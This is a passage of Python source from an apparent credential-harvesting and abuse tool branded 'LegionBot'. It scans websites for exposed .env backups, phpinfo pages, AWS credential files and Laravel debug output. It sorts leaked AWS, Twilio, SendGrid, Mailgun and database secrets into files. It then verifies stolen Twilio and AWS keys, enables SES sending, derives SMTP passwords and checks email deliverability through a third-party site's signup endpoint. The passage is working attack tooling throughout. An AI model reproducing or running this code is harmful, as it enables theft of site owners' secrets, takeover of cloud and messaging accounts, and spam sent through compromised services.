                        self.write_file(result_office, url_config)
                    elif "ionos" in get_config.text:
                        self.show_status_message(
                            ##time=time_now,
                            counter=counter,
                            length=length,
                            data=url_config,
                            message="Found Ionos",
                            status=True,
                            mode="Hidden Debug Results",
                        )
                        self.write_file(result_ionos, url_config)
                    elif "MAIL_PASSWORD" in get_config.text:
                        self.show_status_message(
                            ##time=time_now,
                            counter=counter,
                            length=length,
                            data=url_config,
                            message="Found Mail Other",
                            status=True,
                            mode="Hidden Debug Results",
                        )
                        self.write_file(result_mail_other, url_config)
                    elif "mandrillapp" in get_config.text:
                        self.show_status_message(
                            #time=time_now,
                            counter=counter,
                            length=length,
                            data=url_config,
                            message="Found Mandrillapp",
                            status=True,
                            mode="Hidden Debug Results",
                        )
                        self.write_file(result_mandrillapp, url_config)

                    else:
                        if "DB_USERNAME" in get_config.text:
                            self.show_status_message(
                                #time=time_now,
                                counter=counter,
                                length=length,
                                data=url_config,
                                message="Found Database",
                                status=True,
                                mode="Hidden Debug Results",
                            )
                            self.write_file(result_database, url_config)
                            self.write_file(result_variable, url_config)


                else:

                    url_config = "/".join([target_url, "phpinfo.php"])
                    get_config = requests.get(url=url_config, headers=headers, allow_redirects=True, timeout=15, verify=False)

                    if "PHP Variables" in get_config.text and "Environment" in get_config.text:
                        if "AKIA" in get_config.text:
                            self.show_status_message(
                                #time=time_now,
                                counter=counter,
                                length=length,
                                data=url_config,
                                message="Found AWS",
                                status=True,
                                mode="Hidden Debug Results",
                            )
                            self.write_file(result_aws, url_config)
                        elif "TWILIO" in get_config.text or "twilio" in get_config.text:
                            self.show_status_message(
                                #time=time_now,counter=counter,
                                length=length,
                                data=url_config,
                                message="Found TWILIO",
                                status=True,
                                mode="Hidden Debug Results",
                            )
                            self.write_file(result_twilio, url_config)
                        elif "PLIVO" in get_config.text or "plivo" in get_config.text:
                            self.show_status_message(
                                #time=time_now,
                                counter=counter,
                                length=length,
                                data=url_config,
                                message="Found PLIVO",
                                status=True,
                                mode="Hidden Debug Results",
                            )
                            self.write_file(result_plivo, url_config)
                        elif "NEXMO" in get_config.text or "nexmo" in get_config.text:
                            self.show_status_message(
                                #time=time_now,
                                counter=counter,
                                length=length,
                                data=url_config,
                                message="Found Nexmo",
                                status=True,
                                mode="Hidden Debug Results",
                            )
                            self.write_file(result_nexmo, url_config)
                        elif "COINPAYMENTS" in get_config.text:
                            self.show_status_message(
                                #time=time_now,
                                counter=counter,
                                length=length,
                                data=url_config,
                                message="Found CoinPayments",
                                status=True,
                                mode="Hidden Debug Results",
                            )
                            self.write_file(result_coinpayments, url_config)
                        elif "SG." in get_config.text or "sendgrid" in get_config.text:
                            self.show_status_message(
                                #time=time_now,
                                counter=counter,
                                length=length,
                                data=url_config,
                                message="Found Sendgrid",
                                status=True,
                                mode="Hidden Debug Results",
                            )
                            self.write_file(result_sendgrid, url_config)
                        elif "mailgun" in get_config.text:
                            self.show_status_message(
                                #time=time_now,
                                counter=counter,
                                length=length,
                                data=url_config,
                                message="Found Mailgun",
                                status=True,
                                mode="Hidden Debug Results",
                            )
                            self.write_file(result_mailgun, url_config)
                        elif "office365" in get_config.text:
                            self.show_status_message(
                                #time=time_now,
                                counter=counter,
                                length=length,
                                data=url_config,
                                message="Found Office365",
                                status=True,
                                mode="Hidden Debug Results",
                            )
                            self.write_file(result_office, url_config)
                        elif "ionos" in get_config.text:
                            self.show_status_message(
                                #time=time_now,
                                counter=counter,
                                length=length,
                                data=url_config,
                                message="Found Ionos",
                                status=True,
                                mode="Hidden Debug Results",
                            )
                            self.write_file(result_ionos, url_config)
                        elif "MAIL_PASSWORD" in get_config.text:
                            self.show_status_message(
                                #time=time_now,
                                counter=counter,
                                length=length,
                                data=url_config,
                                message="Found Mail Other",
                                status=True,
                                mode="Hidden Debug Results",
                            )
                            self.write_file(result_mail_other, url_config)
                        elif "mandrillapp" in get_config.text:
                            self.show_status_message(
                                #time=time_now,
                                counter=counter,
                                length=length,
                                data=url_config,
                                message="Found Mandrillapp",
                                status=True,
                                mode="Hidden Debug Results",
                            )
                            self.write_file(result_mandrillapp, url_config)

                        else:
                            if "DB_USERNAME" in get_config.text:
                                self.show_status_message(
                                    #time=time_now,
                                    counter=counter,
                                    length=length,
                                    data=url_config,
                                    message="Found Database",
                                    status=True,
                                    mode="Hidden Debug Results",
                                )
                                self.write_file(result_database, url_config)
                                self.write_file(result_variable, url_config)

                    else:

                        url_config = "/".join([target_url, "phpinfo"])
                        get_config = requests.get(url=url_config, headers=headers, allow_redirects=True, timeout=15, verify=False)

                        if "PHP Variables" in get_config.text and "Environment" in get_config.text:
                            if "AKIA" in get_config.text:
                                self.show_status_message(
                                    #time=time_now,
                                    counter=counter,
                                    length=length,
                                    data=url_config,
                                    message="Found AWS",
                                    status=True,
                                    mode="Hidden Debug Results"
                                )
                                self.write_file(result_aws, url_config)
                            elif "TWILIO" in get_config.text or "twilio" in get_config.text:
                                self.show_status_message(
                                    #time=time_now,counter=counter,
                                    length=length,
                                    data=url_config,
                                    message="Found Twilio",
                                    status=True,
                                    mode="Hidden Debug Results",
                                )
                                self.write_file(result_twilio, url_config)
                            elif "PLIVO" in get_config.text or "plivo" in get_config.text:
                                self.show_status_message(
                                    #time=time_now,
                                    counter=counter,
                                    length=length,
                                    data=url_config,
                                    message="Found Plivo",
                                    status=True,
                                    mode="Hidden Debug Results",
                                )
                                self.write_file(result_plivo, url_config)
                            elif "NEXMO" in get_config.text or "nexmo" in get_config.text:
                                self.show_status_message(
                                    #time=time_now,
                                    counter=counter,
                                    length=length,
                                    data=url_config,
                                    message="Found Nexmo",
                                    status=True,
                                    mode="Hidden Debug Results",
                                )
                                self.write_file(result_nexmo, url_config)
                            elif "COINPAYMENTS" in get_config.text:
                                self.show_status_message(
                                    #time=time_now,
                                    counter=counter,
                                    length=length,
                                    data=url_config,
                                    message="Found Coinpayments",
                                    status=True,
                                    mode="Hidden Debug Results",
                                )
                                self.write_file(result_coinpayments, url_config)
                            elif "SG." in get_config.text or "sendgrid" in get_config.text:
                                self.show_status_message(
                                    #time=time_now,
                                    counter=counter,
                                    length=length,
                                    data=url_config,
                                    message="Found Sendgrid",
                                    status=True,
                                    mode="Hidden Debug Results",
                                )
                                self.write_file(result_sendgrid, url_config)
                            elif "mailgun" in get_config.text:
                                self.show_status_message(
                                    #time=time_now,
                                    counter=counter,
                                    length=length,
                                    data=url_config,
                                    message="Found Mailgun",
                                    status=True,
                                    mode="Hidden Debug Results",
                                )
                                self.write_file(result_mailgun, url_config)
                            elif "office365" in get_config.text:
                                self.show_status_message(
                                    #time=time_now,
                                    counter=counter,
                                    length=length,
                                    data=url_config,
                                    message="Found Office365",
                                    status=True,
                                    mode="Hidden Debug Results",
                                )
                                self.write_file(result_office, url_config)
                            elif "ionos" in get_config.text:
                                self.show_status_message(
                                    #time=time_now,
                                    counter=counter,
                                    length=length,
                                    data=url_config,
                                    message="Found Ionos",
                                    status=True,
                                    mode="Hidden Debug Results",
                                )
                                self.write_file(result_ionos, url_config)
                            elif "MAIL_PASSWORD" in get_config.text:
                                self.show_status_message(
                                    #time=time_now,
                                    counter=counter,
                                    length=length,
                                    data=url_config,
                                    message="Found Mail Other",
                                    status=True,
                                    mode="Hidden Debug Results",
                                )
                                self.write_file(result_mail_other, url_config)
                            elif "mandrillapp" in get_config.text:
                                self.show_status_message(
                                    #time=time_now,
                                    counter=counter,
                                    length=length,
                                    data=url_config,
                                    message="Found Mandrillapp",
                                    status=True,
                                    mode="Hidden Debug Results",
                                )
                                self.write_file(result_mandrillapp, url_config)

                            else:

                                if "DB_USERNAME" in get_config.text:
                                    self.show_status_message(
                                        #time=time_now,
                                        counter=counter,
                                        length=length,
                                        data=url_config,
                                        message="Found Database",
                                        status=True,
                                        mode="Hidden Debug Results",
                                    )
                                    self.write_file(result_database, url_config)
                                    self.write_file(result_variable, url_config)


                        else:

                            url_config = "/".join([target_url, "aws.yml"])
                            get_config = requests.get(url=url_config, headers=headers, allow_redirects=True, timeout=15, verify=False)

                            if "[default]" in get_config.text and "AKIA" in get_config.text:
                                self.show_status_message(
                                    #time=time_now,
                                    counter=counter,
                                    length=length,
                                    data=url_config,
                                    message="Found AWS",
                                    status=True,
                                    mode="Hidden Debug Results",
                                )
                                self.write_file(result_aws, url_config)

                            else:

                                url_config = "/".join([target_url, ".env.bak"])
                                get_config = requests.get(url=url_config, headers=headers, allow_redirects=True, timeout=15, verify=False)

                                if "APP_KEY" in get_config.text:

                                    if "AKIA" in get_config.text:
                                        self.show_status_message(
                                            #time=time_now,
                                            counter=counter,
                                            length=length,
                                            data=url_config,
                                            message="Found AWS",
                                            status=True,
                                            mode="Hidden Debug Results"
                                        )
                                        self.write_file(result_aws, url_config)

                                    elif "TWILIO" in get_config.text or "twilio" in get_config.text:
                                        self.show_status_message(
                                            #time=time_now,counter=counter,
                                            length=length,
                                            data=url_config,
                                            message="Found Twilio",
                                            status=True,
                                            mode="Hidden Debug Results",
                                        )
                                        self.write_file(result_twilio, url_config)
                                    elif "PLIVO" in get_config.text or "plivo" in get_config.text:
                                        self.show_status_message(
                                            #time=time_now,
                                            counter=counter,
                                            length=length,
                                            data=url_config,
                                            message="Found Plivo",
                                            status=True,
                                            mode="Hidden Debug Results",
                                        )
                                        self.write_file(result_plivo, url_config)
                                    elif "NEXMO" in get_config.text or "nexmo" in get_config.text:
                                        self.show_status_message(
                                            #time=time_now,
                                            counter=counter,
                                            length=length,
                                            data=url_config,
                                            message="Found Nexmo",
                                            status=True,
                                            mode="Hidden Debug Results",
                                        )
                                        self.write_file(result_nexmo, url_config)
                                    elif "COINPAYMENTS" in get_config.text:
                                        self.show_status_message(
                                            #time=time_now,
                                            counter=counter,
                                            length=length,
                                            data=url_config,
                                            message="Found Coinpayments",
                                            status=True,
                                            mode="Hidden Debug Results",
                                        )
                                        self.write_file(result_coinpayments, url_config)
                                    elif "SG." in get_config.text or "sendgrid" in get_config.text:
                                        self.show_status_message(
                                            #time=time_now,
                                            counter=counter,
                                            length=length,
                                            data=url_config,
                                            message="Found Sendgrid",
                                            status=True,
                                            mode="Hidden Debug Results",
                                        )
                                        self.write_file(result_sendgrid, url_config)
                                    elif "mailgun" in get_config.text:
                                        self.show_status_message(
                                            #time=time_now,
                                            counter=counter,
                                            length=length,
                                            data=url_config,
                                            message="Found Mailgun",
                                            status=True,
                                            mode="Hidden Debug Results",
                                        )
                                        self.write_file(result_mailgun, url_config)
                                    elif "office365" in get_config.text:
                                        self.show_status_message(
                                            #time=time_now,
                                            counter=counter,
                                            length=length,
                                            data=url_config,
                                            message="Found Office365",
                                            status=True,
                                            mode="Hidden Debug Results",
                                        )
                                        self.write_file(result_office, url_config)
                                    elif "ionos" in get_config.text:
                                        self.show_status_message(
                                            #time=time_now,
                                            counter=counter,
                                            length=length,
                                            data=url_config,
                                            message="Found Ionos",
                                            status=True,
                                            mode="Hidden Debug Results",
                                        )
                                        self.write_file(result_ionos, url_config)
                                    elif "MAIL_PASSWORD" in get_config.text:
                                        self.show_status_message(
                                            #time=time_now,
                                            counter=counter,
                                            length=length,
                                            data=url_config,
                                            message="Found Mail Other",
                                            status=True,
                                            mode="Hidden Debug Results",
                                        )
                                        self.write_file(result_mail_other, url_config)
                                    elif "mandrillapp" in get_config.text:
                                        self.show_status_message(
                                            #time=time_now,
                                            counter=counter,
                                            length=length,
                                            data=url_config,
                                            message="Found Mandrillapp",
                                            status=True,
                                            mode="Hidden Debug Results",
                                        )
                                        self.write_file(result_mandrillapp, url_config)

                                    else:

                                        if "DB_USERNAME" in get_config.text:
                                            self.show_status_message(
                                                #time=time_now,
                                                counter=counter,
                                                length=length,
                                                data=url_config,
                                                message="Found Database",
                                                status=True,
                                                mode="Hidden Debug Results",
                                            )
                                            self.write_file(result_database, url_config)
                                            self.write_file(result_variable, url_config)

                                else:

                                    url_config = "/".join([target_url, "info.php"])
                                    get_config = requests.get(url=url_config, headers=headers, allow_redirects=True, timeout=15, verify=False)

                                    if "PHP Variables" in get_config.text and "Environment" in get_config.text:

                                        if "AKIA" in get_config.text:
                                            self.show_status_message(
                                                #time=time_now,
                                                counter=counter,
                                                length=length,
                                                data=url_config,
                                                message="Found AWS",
                                                status=True,
                                                mode="Hidden Debug Results"
                                            )
                                            self.write_file(result_aws, url_config)
                                        elif "TWILIO" in get_config.text or "twilio" in get_config.text:
                                            self.show_status_message(
                                                #time=time_now,counter=counter,
                                                length=length,
                                                data=url_config,
                                                message="Found Twilio",
                                                status=True,
                                                mode="Hidden Debug Results",
                                            )
                                            self.write_file(result_twilio, url_config)
                                        elif "PLIVO" in get_config.text or "plivo" in get_config.text:
                                            self.show_status_message(
                                                #time=time_now,
                                                counter=counter,
                                                length=length,
                                                data=url_config,
                                                message="Found Plivo",
                                                status=True,
                                                mode="Hidden Debug Results",
                                            )
                                            self.write_file(result_plivo, url_config)
                                        elif "NEXMO" in get_config.text or "nexmo" in get_config.text:
                                            self.show_status_message(
                                                #time=time_now,
                                                counter=counter,
                                                length=length,
                                                data=url_config,
                                                message="Found Nexmo",
                                                status=True,
                                                mode="Hidden Debug Results",
                                            )
                                            self.write_file(result_nexmo, url_config)
                                        elif "COINPAYMENTS" in get_config.text:
                                            self.show_status_message(
                                                #time=time_now,
                                                counter=counter,
                                                length=length,
                                                data=url_config,
                                                message="Found Coinpayments",
                                                status=True,
                                                mode="Hidden Debug Results",
                                            )
                                            self.write_file(result_coinpayments, url_config)
                                        elif "SG." in get_config.text or "sendgrid" in get_config.text:
                                            self.show_status_message(
                                                #time=time_now,
                                                counter=counter,
                                                length=length,
                                                data=url_config,
                                                message="Found Sendgrid",
                                                status=True,
                                                mode="Hidden Debug Results",
                                            )
                                            self.write_file(result_sendgrid, url_config)
                                        elif "mailgun" in get_config.text:
                                            self.show_status_message(
                                                #time=time_now,
                                                counter=counter,
                                                length=length,
                                                data=url_config,
                                                message="Found Mailgun",
                                                status=True,
                                                mode="Hidden Debug Results",
                                            )
                                            self.write_file(result_mailgun, url_config)
                                        elif "office365" in get_config.text:
                                            self.show_status_message(
                                                #time=time_now,
                                                counter=counter,
                                                length=length,
                                                data=url_config,
                                                message="Found Office365",
                                                status=True,
                                                mode="Hidden Debug Results",
                                            )
                                            self.write_file(result_office, url_config)
                                        elif "ionos" in get_config.text:
                                            self.show_status_message(
                                                #time=time_now,
                                                counter=counter,
                                                length=length,
                                                data=url_config,
                                                message="Found Ionos",
                                                status=True,
                                                mode="Hidden Debug Results",
                                            )
                                            self.write_file(result_ionos, url_config)
                                        elif "MAIL_PASSWORD" in get_config.text:
                                            self.show_status_message(
                                                #time=time_now,
                                                counter=counter,
                                                length=length,
                                                data=url_config,
                                                message="Found Mail Other",
                                                status=True,
                                                mode="Hidden Debug Results",
                                            )
                                            self.write_file(result_mail_other, url_config)
                                        elif "mandrillapp" in get_config.text:
                                            self.show_status_message(
                                                #time=time_now,
                                                counter=counter,
                                                length=length,
                                                data=url_config,
                                                message="Found Mandrillapp",
                                                status=True,
                                                mode="Hidden Debug Results",
                                            )
                                            self.write_file(result_mandrillapp, url_config)

                                        else:

                                            if "DB_USERNAME" in get_config.text:
                                                self.show_status_message(
                                                    #time=time_now,
                                                    counter=counter,
                                                    length=length,
                                                    data=url_config,
                                                    message="Found Database",
                                                    status=True,
                                                    mode="Hidden Debug Results",
                                                )
                                                self.write_file(result_database, url_config)
                                                self.write_file(result_variable, url_config)

                                    else:

                                        # Missconfigure Admin

                                        url_config = "/".join([target_url, ".aws/credentials"])
                                        get_config = requests.get(url=url_config, headers=headers, allow_redirects=True, timeout=15, verify=False)

                                        if "[default]" in get_config.text and "AKI" in get_config.text:

                                            self.show_status_message(
                                                #time=time_now,
                                                counter=counter,
                                                length=length,
                                                data=url_config,
                                                message="Found AWS",
                                                status=True,
                                                mode="Hidden Debug Results",
                                            )
                                            self.write_file(result_aws, url_config)

                                        else:

                                            # Missconfigure AWS

                                            url_config = "/".join([target_url, "config/aws.yml"])
                                            get_config = requests.get(url=url_config, headers=headers, allow_redirects=True, timeout=15, verify=False)

                                            if "AKI" in get_config.text and "access_key_id" in get_config.text:

                                                self.show_status_message(
                                                    #time=time_now,
                                                    counter=counter,
                                                    length=length,
                                                    data=url_config,
                                                    message="Found AWS",
                                                    status=True,
                                                    mode="Hidden Debug Results",
                                                )
                                                self.write_file(result_aws, url_config)

                                            else:

                                               # Debug Laravel

                                                url_config = target_url
                                                get_config = requests.get(url=url_config, headers=headers, data={"0x[]": "0x_0x"}, allow_redirects=True, timeout=15)

                                                if "APP_KEY" in get_config.text:

                                                    if "AKIA" in get_config.text:
                                                        self.show_status_message(
                                                            #time=time_now,
                                                            counter=counter,
                                                            length=length,
                                                            data=url_config,
                                                            message="Found AWS",
                                                            status=True,
                                                            mode="Hidden Debug Results"
                                                        )
                                                        self.write_file(result_aws, url_config)
                                                    elif "TWILIO" in get_config.text or "twilio" in get_config.text:
                                                        self.show_status_message(
                                                            #time=time_now,counter=counter,
                                                            length=length,
                                                            data=url_config,
                                                            message="Found Twilio",
                                                            status=True,
                                                            mode="Hidden Debug Results",
                                                        )
                                                        self.write_file(result_twilio, url_config)
                                                    elif "PLIVO" in get_config.text or "plivo" in get_config.text:
                                                        self.show_status_message(
                                                            #time=time_now,
                                                            counter=counter,
                                                            length=length,
                                                            data=url_config,
                                                            message="Found Plivo",
                                                            status=True,
                                                            mode="Hidden Debug Results",
                                                        )
                                                        self.write_file(result_plivo, url_config)
                                                    elif "NEXMO" in get_config.text or "nexmo" in get_config.text:
                                                        self.show_status_message(
                                                            #time=time_now,
                                                            counter=counter,
                                                            length=length,
                                                            data=url_config,
                                                            message="Found Nexmo",
                                                            status=True,
                                                            mode="Hidden Debug Results",
                                                        )
                                                        self.write_file(result_nexmo, url_config)
                                                    elif "COINPAYMENTS" in get_config.text:
                                                        self.show_status_message(
                                                            #time=time_now,
                                                            counter=counter,
                                                            length=length,
                                                            data=url_config,
                                                            message="Found Coinpayments",
                                                            status=True,
                                                            mode="Hidden Debug Results",
                                                        )
                                                        self.write_file(result_coinpayments, url_config)
                                                    elif "SG." in get_config.text or "sendgrid" in get_config.text:
                                                        self.show_status_message(
                                                            #time=time_now,
                                                            counter=counter,
                                                            length=length,
                                                            data=url_config,
                                                            message="Found Sendgrid",
                                                            status=True,
                                                            mode="Hidden Debug Results",
                                                        )
                                                        self.write_file(result_sendgrid, url_config)
                                                    elif "mailgun" in get_config.text:
                                                        self.show_status_message(
                                                            #time=time_now,
                                                            counter=counter,
                                                            length=length,
                                                            data=url_config,
                                                            message="Found Mailgun",
                                                            status=True,
                                                            mode="Hidden Debug Results",
                                                        )
                                                        self.write_file(result_mailgun, url_config)
                                                    elif "office365" in get_config.text:
                                                        self.show_status_message(
                                                            #time=time_now,
                                                            counter=counter,
                                                            length=length,
                                                            data=url_config,
                                                            message="Found Office365",
                                                            status=True,
                                                            mode="Hidden Debug Results",
                                                        )
                                                        self.write_file(result_office, url_config)
                                                    elif "ionos" in get_config.text:
                                                        self.show_status_message(
                                                            #time=time_now,
                                                            counter=counter,
                                                            length=length,
                                                            data=url_config,
                                                            message="Found Ionos",
                                                            status=True,
                                                            mode="Hidden Debug Results",
                                                        )
                                                        self.write_file(result_ionos, url_config)
                                                    elif "MAIL_PASSWORD" in get_config.text:
                                                        self.show_status_message(
                                                            #time=time_now,
                                                            counter=counter,
                                                            length=length,
                                                            data=url_config,
                                                            message="Found Mail Other",
                                                            status=True,
                                                            mode="Hidden Debug Results",
                                                        )
                                                        self.write_file(result_mail_other, url_config)
                                                    elif "mandrillapp" in get_config.text:
                                                        self.show_status_message(
                                                            #time=time_now,
                                                            counter=counter,
                                                            length=length,
                                                            data=url_config,
                                                            message="Found Mandrillapp",
                                                            status=True,
                                                            mode="Hidden Debug Results",
                                                        )
                                                        self.write_file(result_mandrillapp, url_config)

                                                    else:
                                                        if "DB_USERNAME" in get_config.text:
                                                            self.show_status_message(
                                                                #time=time_now,
                                                                counter=counter,
                                                                length=length,
                                                                data=url_config,
                                                                message="Found Database",
                                                                status=True,
                                                                mode="Hidden Debug Results",
                                                            )
                                                            self.write_file(result_database, url_config)
                                                            self.write_file(result_variable, url_config)

                                                else:

                                                    url_config = "/".join([target_url, "config.js"])
                                                    get_config = requests.get(url=url_config, headers=headers, allow_redirects=True, timeout=15, verify=False)

                                                    if "ASIA" in get_config.text and "accessKeyId" in get_config.text and "AKIA" in get_config.text:

                                                        self.show_status_message(
                                                            #time=time_now,
                                                            counter=counter,
                                                            length=length,
                                                            data=url_config,
                                                            message="Found AWS",
                                                            status=True,
                                                            mode="Hidden Debug Results",
                                                        )
                                                        self.write_file(result_aws, url_config)

                                                    else:

                                                        self.show_status_message(
                                                            #time=time_now,
                                                            counter=counter,
                                                            length=length,
                                                            data=url_config,
                                                            message="Not Vuln",
                                                            status=False,
                                                            mode="Hidden Debug Results",
                                                        )
            except KeyboardInterrupt:
                raise KeyboardInterrupt
            except (ConnectTimeout, ReadTimeout, Timeout, SSLError, ContentDecodingError, ConnectionError, ChunkedEncodingError, HTTPError, ProxyError, URLRequired, TooManyRedirects, MissingSchema, InvalidSchema, InvalidURL, InvalidHeader, InvalidHeader, InvalidProxyURL, StreamConsumedError, RetryError, UnrewindableBodyError, SocketTimeout, SocketHostError, ReadTimeoutError, DecodeError, AttributeError, ConnectionRefusedError):
                #print('Error on line {}'.format(sys.exc_info()[-1].tb_lineno), type(Error).__name__, Error)
                self.show_status_message(
                    #time=time_now,
                    counter=counter,
                    length=length,
                    data=target_url,
                    message="Cannot Connect or Timeout!",
                    status=False,
                    mode="Hidden Debug Results",
                )

        except KeyboardInterrupt:
            raise KeyboardInterrupt
        except Exception as Error:
            print("".join(traceback.format_exception(etype=type(Error), value=Error, tb=Error.__traceback__)))
            pass
    def email_validator(self, counter, length, email):
        try:
            deliverable_email = self.set_result(filename="deliverable_email.txt")
            undeliverable_email = self.set_result(filename="undeliverable_email.txt")
            unknown_email = self.set_result(filename="unknown_email.txt")
            #time_now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

            try:
                headers = {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0',
                    'Accept': '*/*',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                    'X-Requested-With': 'XMLHttpRequest',
                    'Origin': 'https://www.elevenia.co.id',
                    'Connection': 'keep-alive',
                    'Referer': 'https://www.elevenia.co.id/register/memberRegistForm/memberRegist.do?isSSL=Y',

                }
                data = {
                    'memID': email
                }
                request_validation = requests.post('https://www.elevenia.co.id/register/ValidEmailCheck/isValidEmailAjax.do', headers=headers, data=data)
                raw_result = request_validation.content.decode(encoding="utf-8", errors="ignore")

                if raw_result == "Y":
                    self.show_status_message(
                        #time=time_now,
                        counter=counter,
                        length=length,
                        data=email,
                        message="Deliverable",
                        status=True,
                        mode="Email Validator",
                    )
                    self.write_file(deliverable_email, email)
                elif raw_result == "N":
                    self.show_status_message(
                        #time=time_now,
                        counter=counter,
                        length=length,
                        data=email,
                        message="Not Deliverable",
                        status=False,
                        mode="Email Validator",
                    )
                    self.write_file(undeliverable_email, email)
                else:
                    self.show_status_message(
                        #time=time_now,
                        counter=counter,
                        length=length,
                        data=email,
                        message="Unknown",
                        status=False,
                        mode="Email Validator",
                    )
                    self.write_file(unknown_email, email)

            except KeyboardInterrupt:
                raise KeyboardInterrupt
            except (ConnectTimeout, ReadTimeout, Timeout, SSLError, ContentDecodingError, ConnectionError, ChunkedEncodingError, HTTPError, ProxyError, URLRequired, TooManyRedirects, MissingSchema, InvalidSchema, InvalidURL, InvalidHeader, InvalidHeader, InvalidProxyURL, StreamConsumedError, RetryError, UnrewindableBodyError, SocketTimeout, SocketHostError, ReadTimeoutError, DecodeError, AttributeError, ConnectionRefusedError):
                self.show_status_message(
                    #time=time_now,
                    counter=counter,
                    length=length,
                    data=email,
                    message="Cannot Connect to Email Validator Server",
                    status=False,
                    mode="Email Validator",
                )
        except KeyboardInterrupt:
            raise KeyboardInterrupt
        except Exception as Error:
            print("".join(traceback.format_exception(etype=type(Error), value=Error, tb=Error.__traceback__)))
    def twilio_checker(self, counter, length, acc):
        try:

            twilio_live = self.set_result(filename="twilio_live.txt")
            twilio_dead = self.set_result(filename="twilio_dead.txt")

            acc   = self.safe_string(acc)
            acc   = acc.split("|")
            account_sid = acc[0]
            auth_token  = acc[1]

            #time_now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

            try:
                client                 = twilio.rest.Client(account_sid, auth_token)
                fetch_balance          = client.api.v2010.balance.fetch()
                account                = client.api.accounts.create()
                incoming_phone_numbers = client.incoming_phone_numbers.list(limit=20)
                get_balance            = fetch_balance.balance
                get_currency           = fetch_balance.currency
                get_account_type       = account.type

                for record in incoming_phone_numbers:
                    get_phone = record.phone_number

                self.show_status_message(
                    #time=time_now,
                    counter=counter,
                    length=length,
                    data="|".join([account_sid, auth_token]),
                    message="|".join([get_balance, get_currency, get_account_type, get_phone]),
                    status=True,
                    mode="Twilio Checker"
                )

                build = "|".join([account_sid, auth_token, get_currency, get_account_type, get_phone])
                self.write_file(twilio_live, build)

            except:
                self.show_status_message(
                    #time=time_now,
                    counter=counter,
                    length=length,
                    data="|".join([account_sid, auth_token]),
                    message="Account Key Invalid",
                    status=False,
                    mode="Twilio Checker"
                )
                build = "|".join([account_sid, auth_token])
                self.write_file(twilio_dead, build)

        except KeyboardInterrupt:
            raise KeyboardInterrupt
        except Exception as Error:
            print("".join(traceback.format_exception(etype=type(Error), value=Error, tb=Error.__traceback__)))

    def aws_checker(self, counter, length, acc):
        try:

            acc = self.safe_string(acc)
            acc = acc.split("|")

            aws_access = acc[0]
            aws_secret = acc[1]
            aws_region = acc[2]

            ses_live = self.set_result(filename="ses_live.txt")
            ses_dead = self.set_result(filename="ses_dead.txt")

            smtp_ses_success = self.set_result(filename="smtp_ses_success.txt")
            smtp_ses_failed  = self.set_result(filename="smtp_ses_failed.txt")

            iam_live = self.set_result(filename="iam_live.txt")
            iam_dead = self.set_result(filename="iam_dead.txt")

            #time_now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

            SMTP_REGIONS = [
                'us-east-2',       # US East (Ohio)
                'us-east-1',       # US East (N. Virginia)
                'us-west-2',       # US West (Oregon)

                'ap-south-1',      # Asia Pacific (Mumbai)
                'ap-northeast-2',  # Asia Pacific (Seoul)
                'ap-southeast-1',  # Asia Pacific (Singapore)
                'ap-southeast-2',  # Asia Pacific (Sydney)
                'ap-northeast-1',  # Asia Pacific (Tokyo)
                'ca-central-1',    # Canada (Central)
                'eu-central-1',    # Europe (Frankfurt)
                'eu-west-1',       # Europe (Ireland)
                'eu-west-2',       # Europe (London)
                'sa-east-1',       # South America (Sao Paulo)
                'us-gov-west-1',   # AWS GovCloud (US)
            ]

            def sign(key, msg):
                return hmac.new(key, msg.encode('utf-8'), hashlib.sha256).digest()

            def calculate_key(secret_access_key, region):

                DATE     = "11111111"
                SERVICE  = "ses"
                MESSAGE  = "SendRawEmail"
                TERMINAL = "aws4_request"
                VERSION  = 0x04

                SMTP_REGION = [
                    'us-east-2',       # US East (Ohio)
                    'us-east-1',       # US East (N. Virginia)
                    'us-west-2',       # US West (Oregon)
                    'ap-south-1',      # Asia Pacific (Mumbai)
                    'ap-northeast-2',  # Asia Pacific (Seoul)
                    'ap-southeast-1',  # Asia Pacific (Singapore)
                    'ap-southeast-2',  # Asia Pacific (Sydney)
                    'ap-northeast-1',  # Asia Pacific (Tokyo)
                    'ca-central-1',    # Canada (Central)
                    'eu-central-1',    # Europe (Frankfurt)
                    'eu-west-1',       # Europe (Ireland)
                    'eu-west-2',       # Europe (London)
                    'sa-east-1',       # South America (Sao Paulo)
                    'us-gov-west-1',   # AWS GovCloud (US)
                ]

                if region not in SMTP_REGION:
                    raise ValueError(f"The {region} Region doesn't have an SMTP endpoint.")

                signature = sign(("AWS4" + secret_access_key).encode('utf-8'), DATE)
                signature = sign(signature, region)
                signature = sign(signature, SERVICE)
                signature = sign(signature, TERMINAL)
                signature = sign(signature, MESSAGE)
                signature_and_version = bytes([VERSION]) + signature
                smtp_password = base64.b64encode(signature_and_version)

                return smtp_password.decode('utf-8')

            for region in SMTP_REGIONS:
                try:

                    ses = boto3.client("ses", aws_access_key_id=aws_access, aws_secret_access_key=aws_secret, region_name=region)
                    quota = ses.get_send_quota()
                    verified = ses.list_verified_email_addresses()
                    enable_sending = ses.update_account_sending_enabled(Enabled=True)

                    max_send      = quota["Max24HourSend"]
                    send_rate     = quota["MaxSendRate"]
                    last_send     = quota["SentLast24Hours"]
                    list_verified = verified["VerifiedEmailAddresses"]

                    list_ses = [max_send, send_rate, last_send]

                    self.show_status_message(
                        #time=time_now,
                        counter=counter,
                        length=length,
                        data="|".join([aws_access, aws_secret, region]),
                        message="|".join([str(i) for i in list_ses]),
                        status=True,
                        mode="AWS Checker"
                    )

                    build_ses = "====================[ $$ LegionBot AWS SES $$ ]====================\n"
                    build_ses += "# AWS Access Key ID      : %s\n" % aws_access
                    build_ses += "# AWS Secret Access Key  : %s\n" % aws_secret
                    build_ses += "# AWS Default Region     : %s\n" % region
                    build_ses += "# Max 24 Hour Send       : %s\n" % max_send
                    build_ses += "# Max Send Rate          : %s\n" % send_rate
                    build_ses += "# Sent Last 24 Hours     : %s\n" % last_send
                    if len(list_verified) != 0:
                        for email_verified in list_verified:
                            build_ses += "# Verified Email Address : %s\n" % email_verified
                    build_ses += "=========================================================================\n"
                    append_ses = self.join_string(build_ses)
                    self.write_file(ses_live, append_ses)

                    if len(list_verified) != 0:

                        from_sender     = list_verified[0]
                        from_name       = "Legionaws"
